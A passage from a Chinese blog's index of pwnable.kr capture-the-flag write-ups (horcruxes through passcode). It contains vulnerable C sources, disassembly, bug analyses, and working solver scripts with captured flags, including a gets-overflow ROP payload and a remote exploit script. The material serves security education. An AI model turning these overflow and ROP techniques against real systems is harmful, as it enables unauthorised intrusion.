0;}在gets中存在栈溢出，题目是要知道A+B+C+D+E+F+G的值，等于sum即可，所以我们只要通过ROP，分别执行A、B、C、D、E、F、G，最后再执行ropme，输入sumget flag#123456789101112131415161718192021222324252627282930from pwn import *context.log_level = 'debug'p = process('horcruxes')elf = ELF('horcruxes')A = elf.symbols['A']B = elf.symbols['B']C = elf.symbols['C']D = elf.symbols['D']E = elf.symbols['E']F = elf.symbols['F']G = elf.symbols['G']ropme = elf.symbols['ropme']ropme = 0x809fffcpayload = 'a'*(0x74+4)payload += p32(A)+p32(B)+p32(C)+p32(D)+p32(E)+p32(F)+p32(G)+p32(ropme)p.sendline('1')import timetime.sleep(1)p.sendline(payload)result = p.recv().split('\\n')[4:11]total = 0for line in result: line = line.split('+')[1].split(')')[0] print line total+=eval(line)p.sendline('1')p.recv()p.sendline(str(total))p.recv()p.interactive()","link":"/62d14747.html"},{"title":"pwnable.kr —— input","text":"question#123Mom? how can I pass my input to a computer program?ssh input2@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上查看ssh input2@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录input.c#12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[]){ printf(&quot;Welcome to pwnable.kr\\n&quot;); printf(&quot;Let's see if you know how to give input to program\\n&quot;); printf(&quot;Just give me correct inputs then you will get the flag :)\\n&quot;); // argv if(argc != 100) return 0; if(strcmp(argv['A'],&quot;\\x00&quot;)) return 0; if(strcmp(argv['B'],&quot;\\x20\\x0a\\x0d&quot;)) return 0; printf(&quot;Stage 1 clear!\\n&quot;); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0; printf(&quot;Stage 2 clear!\\n&quot;); // env if(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0; printf(&quot;Stage 3 clear!\\n&quot;); // file FILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0; fclose(fp); printf(&quot;Stage 4 clear!\\n&quot;); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(&quot;socket error, tell admin\\n&quot;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ printf(&quot;bind error, use another port\\n&quot;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0){ printf(&quot;accept error, tell admin\\n&quot;); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0; printf(&quot;Stage 5 clear!\\n&quot;); // here's your flag system(&quot;/bin/cat flag&quot;); return 0;}analyse#step 1:#1234if(argc != 100) return 0;if(strcmp(argv['A'],&quot;\\x00&quot;)) return 0;if(strcmp(argv['B'],&quot;\\x20\\x0a\\x0d&quot;)) return 0;printf(&quot;Stage 1 clear!\\n&quot;);也就是说在执行时传入的参数时，需要有100个参数（包含./input），并且其中的argv['A']要等于\\x00,argv['B']要等于\\x20\\x0a\\x0d。step 2:#1234567 // stdiochar buf[4];read(0, buf, 4);if(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;read(2, buf, 4); if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;printf(&quot;Stage 2 clear!\\n&quot;);标准输入输出，从标准输入读取4字节\\x00\\x0a\\x00\\xff，从标准错误读取四字节\\x00\\x0a\\x02\\xffstep 3:#123// envif(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0;printf(&quot;Stage 3 clear!\\n&quot;);设置环境变量\\xde\\xad\\xbe\\xef的值为\\xca\\xfe\\xba\\xbestep 4:#123456 FILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;);if(!fp) return 0;if( fread(buf, 4, 1, fp)!=1 ) return 0;if( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0;fclose(fp);printf(&quot;Stage 4 clear!\\n&quot;);文件操作，从\\x0a文件读取四字节，看是否为\\x00\\x00\\x00\\x00step 5:#123456789101112131415161718192021222324int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(&quot;socket error, tell admin\\n&quot;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ printf(&quot;bind error, use another port\\n&quot;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0){ printf(&quot;accept error, tell admin\\n&quot;); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0; printf(&quot;Stage 5 clear!\\n&quot;);socket 编程，打开端口argv['C']，监听直到接收到数值，判断是否为\\xde\\xad\\xbe\\xefget flag#12345678910111213141516171819202122232425262728293031# input.pyimport osimport socketimport timeimport subprocessstdinr, stdinw = os.pipe()stderrr, stderrw = os.pipe()args = list(\"A\"*99)args[ord('A') - 1] = \"\"args[ord('B') - 1] = \"\\x20\\x0a\\x0d\"args[ord(\"C\") - 1] = \"8888\"os.write(stdinw, \"\\x00\\x0a\\x00\\xff\")os.write(stderrw, \"\\x00\\x0a\\x02\\xff\")environ = {\"\\xde\\xad\\xbe\\xef\" : \"\\xca\\xfe\\xba\\xbe\"}f = open(\"\\x0a\" , \"wb\")f.write(\"\\x00\"*4)f.close()s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)pro = subprocess.Popen([\"/home/input2/input\"]+args, stdin=stdinr,stderr=stderrr,env=environ)time.sleep(2)s.connect((\"127.0.0.1\", 8888))s.send(\"\\xde\\xad\\xbe\\xef\")s.close()但是并没有这么简单，由于文件夹读写权限问题，我们首先需要将脚本scp到/tmp目录下，然后新建一个自己的目录，接着分别建立input.py和flag文件的软链接到自己的目录下，然后执行脚本。12345678910111213141516input2@ubuntu:/tmp$ mkdir ycdinput2@ubuntu:/tmp$ cd ycdinput2@ubuntu:/tmp/ycd$ mv ../input.py .input2@ubuntu:/tmp/ycd$ lsinput.pyinput2@ubuntu:/tmp/ycd$ ln -s /home/input2/flag flaginput2@ubuntu:/tmp/ycd$ python input.pyWelcome to pwnable.krLet's see if you know how to give input to programJust give me correct inputs then you will get the flag :)Stage 1 clear!Stage 2 clear!Stage 3 clear!Stage 4 clear!Stage 5 clear!Mommy! I learned how to pass various input in Linux :)flag:Mommy! I learned how to pass various input in Linux :)","link":"/2e1b27bb.html"},{"title":"pwnable.kr —— leg","text":"question#1234567Daddy told me I should study arm.But I prefer to study my leg!Download : http://pwnable.kr/bin/leg.cDownload : http://pwnable.kr/bin/leg.asmssh leg@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上ssh leg@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录leg.c#1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1(){ asm(&quot;mov r3, pc\\n&quot;);}int key2(){ asm( &quot;push {r6}\\n&quot; &quot;add r6, pc, $1\\n&quot; &quot;bx r6\\n&quot; &quot;.code 16\\n&quot; &quot;mov r3, pc\\n&quot; &quot;add r3, $0x4\\n&quot; &quot;push {r3}\\n&quot; &quot;pop {pc}\\n&quot; &quot;.code 32\\n&quot; &quot;pop {r6}\\n&quot; );}int key3(){ asm(&quot;mov r3, lr\\n&quot;);}int main(){ int key=0; printf(&quot;Daddy has very strong arm! : &quot;); scanf(&quot;%d&quot;, &amp;key); if( (key1()+key2()+key3()) == key ){ printf(&quot;Congratz!\\n&quot;); int fd = open(&quot;flag&quot;, O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(&quot;I have strong leg :P\\n&quot;); } return 0;}leg.asm#12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879(gdb) disass mainDump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push {r4, r11, lr} 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop {r4, r11, pc} 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push {r3} 0x00008d0a &lt;+26&gt;: pop {pc} 0x00008d0c &lt;+28&gt;: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb)analyse#c与asm混合编程，只要我们输入的key的值等于key1()+key2()+key3()的值即可。key1()#12345670x00008cd4 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!)0x00008cd8 &lt;+4&gt;: add r11, sp, #00x00008cdc &lt;+8&gt;: mov r3, pc0x00008ce0 &lt;+12&gt;: mov r0, r30x00008ce4 &lt;+16&gt;: sub sp, r11, #00x00008ce8 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4)0x00008cec &lt;+24&gt;: bx lr返回值为r0,r0保存的是0x00008cdc处时的pc值，由于流水线处理，pc为进接的第二条指令的地址，pc=0x00008ce4，key1()=0x00008ce4key2()#12345678910111213140x00008cf0 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!)0x00008cf4 &lt;+4&gt;: add r11, sp, #00x00008cf8 &lt;+8&gt;: push {r6} ; (str r6, [sp, #-4]!)0x00008cfc &lt;+12&gt;: add r6, pc, #10x00008d00 &lt;+16&gt;: bx r60x00008d04 &lt;+20&gt;: mov r3, pc0x00008d06 &lt;+22&gt;: adds r3, #40x00008d08 &lt;+24&gt;: push {r3}0x00008d0a &lt;+26&gt;: pop {pc}0x00008d0c &lt;+28&gt;: pop {r6} ; (ldr r6, [sp], #4)0x00008d10 &lt;+32&gt;: mov r0, r30x00008d14 &lt;+36&gt;: sub sp, r11, #00x00008d18 &lt;+40&gt;: pop {r11} ; (ldr r11, [sp], #4)0x00008d1c &lt;+44&gt;: bx lr同key1(),r0保存的是r3+#4，而r3是0X00008d04时的pc值，pc=0x00008d08,所以key2()=0x00008d08+4=0x00008d0ckey3()#12345670x00008d20 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!)0x00008d24 &lt;+4&gt;: add r11, sp, #00x00008d28 &lt;+8&gt;: mov r3, lr0x00008d2c &lt;+12&gt;: mov r0, r30x00008d30 &lt;+16&gt;: sub sp, r11, #00x00008d34 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4)0x00008d38 &lt;+24&gt;: bx lrr0的值是lr的值，而lr是子函数返回位置的地址，在main函数中可以看到为0x00008d80get flag#所以我们知道key应该等于0x00008d80+0x00008d0c+0x00008ce4=1084001234/ $ ./legDaddy has very strong arm! : 108400Congratz!My daddy has a lot of ARMv5te muscle!flag：My daddy has a lot of ARMv5te muscle!","link":"/232eb954.html"},{"title":"pwnable.kr —— lotto","text":"question#12345Mommy! I made a lotto program for my homework.do you want to play?ssh lotto@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上ssh lotto@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录lotto.c#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play(){ int i; printf(\"Submit your 6 lotto bytes : \"); fflush(stdout); int r; r = read(0, submit, 6); printf(\"Lotto Start!\\n\"); //sleep(1); // generate lotto numbers int fd = open(\"/dev/urandom\", O_RDONLY); if(fd==-1){ printf(\"error. tell admin\\n\"); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(\"error2. tell admin\\n\"); exit(-1); } for(i=0; i&lt;6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++){ for(j=0; j&lt;6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(\"/bin/cat flag\"); } else{ printf(\"bad luck...\\n\"); }}void help(){ printf(\"- nLotto Rule -\\n\"); printf(\"nlotto is consisted with 6 random natural numbers less than 46\\n\"); printf(\"your goal is to match lotto numbers as many as you can\\n\"); printf(\"if you win lottery for *1st place*, you will get reward\\n\"); printf(\"for more details, follow the link below\\n\"); printf(\"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n\"); printf(\"mathematical chance to win this game is known to be 1/8145060.\\n\");}int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(\"- Select Menu -\\n\"); printf(\"1. Play Lotto\\n\"); printf(\"2. Help\\n\"); printf(\"3. Exit\\n\"); scanf(\"%d\", &amp;menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(\"bye\\n\"); return 0; default: printf(\"invalid menu\\n\"); break; } } return 0;}analyse#注意到：1234567for(i=0; i&lt;6; i++){ for(j=0; j&lt;6; j++){ if(lotto[i] == submit[j]){ match++; } }}循环中，只要自己输入的submit[j] 6个都相同，那么只要与某个lotto[i]一致，就可以破除，所以看下ascii码在1-45中的某个字符尝试输入几次即可get flag#使用’++++++'输入123Submit your 6 lotto bytes : ++++++Lotto Start!sorry mom... I FORGOT to check duplicate numbers... :(flag：sorry mom... I FORGOT to check duplicate numbers... :(","link":"/ca309fdf.html"},{"title":"pwnable.kr —— memcpy","text":"question#1234567Are you tired of hacking?, take some rest here.Just help me out with my small experiment regarding memcpy performance. after that, flag is yours.http://pwnable.kr/bin/memcpy.cssh memcpy@pwnable.kr -p2222 (pw:guest)memcpy.c#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc(){ asm(&quot;rdtsc&quot;);}char* slow_memcpy(char* dest, const char* src, size_t len){ int i; for (i=0; i&lt;len; i++) { dest[i] = src[i]; } return dest;}char* fast_memcpy(char* dest, const char* src, size_t len){ size_t i; // 64-byte block fast copy if(len &gt;= 64){ i = len / 64; len &amp;= (64-1); while(i-- &gt; 0){ __asm__ __volatile__ ( &quot;movdqa (%0), %%xmm0\\n&quot; &quot;movdqa 16(%0), %%xmm1\\n&quot; &quot;movdqa 32(%0), %%xmm2\\n&quot; &quot;movdqa 48(%0), %%xmm3\\n&quot; &quot;movntps %%xmm0, (%1)\\n&quot; &quot;movntps %%xmm1, 16(%1)\\n&quot; &quot;movntps %%xmm2, 32(%1)\\n&quot; &quot;movntps %%xmm3, 48(%1)\\n&quot; ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;); dest += 64; src += 64; } } // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;}int main(void){ setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(&quot;Hey, I have a boring assignment for CS class.. :(\\n&quot;); printf(&quot;The assignment is simple.\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;- What is the best implementation of memcpy? -\\n&quot;); printf(&quot;- 1. implement your own slow/fast version of memcpy -\\n&quot;); printf(&quot;- 2. compare them with various size of data -\\n&quot;); printf(&quot;- 3. conclude your experiment and submit report -\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;This time, just help me out with my experiment and get flag\\n&quot;); printf(&quot;No fancy hacking, I promise :D\\n&quot;); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++){ // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high); scanf(&quot;%d&quot;, &amp;size); if( size &lt; low || size &gt; high ){ printf(&quot;don't mess with the experiment.\\n&quot;); exit(0); } sizes[i++] = size; } sleep(1); printf(&quot;ok, lets run the experiment with your configuration\\n&quot;); sleep(1); // run experiment for(i=0; i&lt;10; i++){ size = sizes[i]; printf(&quot;experiment %d : memcpy with buffer size %d\\n&quot;, i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\\n&quot;, t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\\n&quot;, t2-t1); printf(&quot;\\n&quot;); } printf(&quot;thanks for helping my experiment!\\n&quot;); printf(&quot;flag : ----- erased in this source code -----\\n&quot;); return 0;}可以看到是依次使用fast_memcpy和slow_memcpy 函数比较使用时间analyse#随便输入范围内数字会出现segmentation fault，问题出在汇编指令movntps。查阅资料可以看到，当使用这个指令时，内存必须按照16字节对齐1The destination operand is a 128-bit or 256-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version) or 32-byte (VEX.256 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.而用户使用malloc申请内存却是以8字节对齐的，假如用户申请内存大小x，那么分配后的块大小为8*(int((x+4)/8)+1)。因此对于给定大小low和high限定，我们可以计算得到合适的内存大小x1234def get_input(low,high): for i in xrange(low,high): if ((i+4)%16&gt;=9) or ((i+4)%16==0): return iget flag#1234567891011121314151617181920from pwn import *def get_input(low,high): for i in xrange(low,high): if ((i+4)%16&gt;=9) or ((i+4)%16==0): return i#context.log_level = 'debug'p = remote(&quot;pwnable.kr&quot;,9022)#p = process('./memcpy')for i in range(0,10): import time time.sleep(1) result = p.recv() result = result.split(&quot;\\n&quot;)[-1] low = int(result.split(&quot; &quot;)[5]) high = int(result.split(&quot; &quot;)[7]) output = get_input(low,high) print &quot;info:%d %d , input: %d&quot;%(low,high,output) p.sendline(str(output))p.interactive()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 ↵ 1  python CTF/Challenges/pwnable.kr/part1/memcpy/memcpy.py[+] Opening connection to pwnable.kr on port 9022: Doneinfo:8 16 , input: 8info:16 32 , input: 21info:32 64 , input: 37info:64 128 , input: 69info:128 256 , input: 133info:256 512 , input: 261info:512 1024 , input: 517info:1024 2048 , input: 1029info:2048 4096 , input: 2053info:4096 8192 , input: 4101[*] Switching to interactive modeok, lets run the experiment with your configurationexperiment 1 : memcpy with buffer size 8ellapsed CPU cycles for slow_memcpy : 2036ellapsed CPU cycles for fast_memcpy : 172experiment 2 : memcpy with buffer size 21ellapsed CPU cycles for slow_memcpy : 220ellapsed CPU cycles for fast_memcpy : 252experiment 3 : memcpy with buffer size 37ellapsed CPU cycles for slow_memcpy : 336ellapsed CPU cycles for fast_memcpy : 388experiment 4 : memcpy with buffer size 69ellapsed CPU cycles for slow_memcpy : 508ellapsed CPU cycles for fast_memcpy : 182experiment 5 : memcpy with buffer size 133ellapsed CPU cycles for slow_memcpy : 1042ellapsed CPU cycles for fast_memcpy : 152experiment 6 : memcpy with buffer size 261ellapsed CPU cycles for slow_memcpy : 1854ellapsed CPU cycles for fast_memcpy : 204experiment 7 : memcpy with buffer size 517ellapsed CPU cycles for slow_memcpy : 3658ellapsed CPU cycles for fast_memcpy : 186experiment 8 : memcpy with buffer size 1029ellapsed CPU cycles for slow_memcpy : 7146ellapsed CPU cycles for fast_memcpy : 374experiment 9 : memcpy with buffer size 2053ellapsed CPU cycles for slow_memcpy : 14326ellapsed CPU cycles for fast_memcpy : 680experiment 10 : memcpy with buffer size 4101ellapsed CPU cycles for slow_memcpy : 30404ellapsed CPU cycles for fast_memcpy : 1284thanks for helping my experiment!flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt[*] Got EOF while reading in interactiveflag:1_w4nn4_br34K_th3_m3m0ry_4lignm3nt","link":"/95b3b1b5.html"},{"title":"pwnable.kr —— mistake","text":"question#123456789We all make mistakes, let's move on.(don't take this too seriously, no fancy hacking skill is required at all)This task is based on real eventThanks to dhmonkeyhint : operator priorityssh mistake@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上ssh mistake@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录mistake.c#1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len){ int i; for(i=0; i&lt;len; i++){ s[i] ^= XORKEY; }}int main(int argc, char* argv[]){ int fd; if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){ printf(&quot;can't open password %d\\n&quot;, fd); return 0; } printf(&quot;do not bruteforce...\\n&quot;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){ printf(&quot;read error\\n&quot;); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(&quot;input password : &quot;); scanf(&quot;%10s&quot;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(&quot;Password OK\\n&quot;); system(&quot;/bin/cat flag\\n&quot;); } else{ printf(&quot;Wrong Password\\n&quot;); } close(fd); return 0;}analyse#只是两次输入异或操作然后比较？输入0000000000再输入11111111111即可get flag#123456mistake@ubuntu:~$ ./mistake do not bruteforce...0000000000input password : 1111111111Password OKMommy, the operator priority always confuses me :(flag：Mommy, the operator priority always confuses me :(","link":"/5488b1c2.html"},{"title":"pwnable.kr —— passcode","text":"question#12345Mommy told me to make a passcode based login system.My initial C code was compiled without any error!Well, there was some compiler warning, but who cares about that?ssh passcode@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上查看ssh passcode@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录passcode.c#12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); }}void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name);}int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; }analyse#考点：GOT表scanf使用错误可以看到在函数login中对scanf的使用错误，因此我们只要能控制passcode1的值，就可以控制写入的地址同时welcome没有参数，login也没有参数，我们可以通过welcome中的name来控制login中的passcode1的值。用objdump -S passcode查看汇编代码可以看到，name位于ebp-0x70，passcode1位于ebp-0x10，passcode2位于ebp-0xc，但是name读入长度为100，无法覆盖到passcode2的值。看下可执行文件中的函数12345678910111213141516Relocation section '.rel.dyn' at offset 0x388 contains 2 entries: Offset Info Type Sym.Value Sym. Name08049ff0 00000606 R_386_GLOB_DAT 00000000 __gmon_start__0804a02c 00000b05 R_386_COPY 0804a02c stdin@GLIBC_2.0Relocation section '.rel.plt' at offset 0x398 contains 9 entries: Offset Info Type Sym.Value Sym. Name0804a000 00000107 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.00804a004 00000207 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.00804a008 00000307 R_386_JUMP_SLOT 00000000 __stack_chk_fail@GLIBC_2.40804a00c 00000407 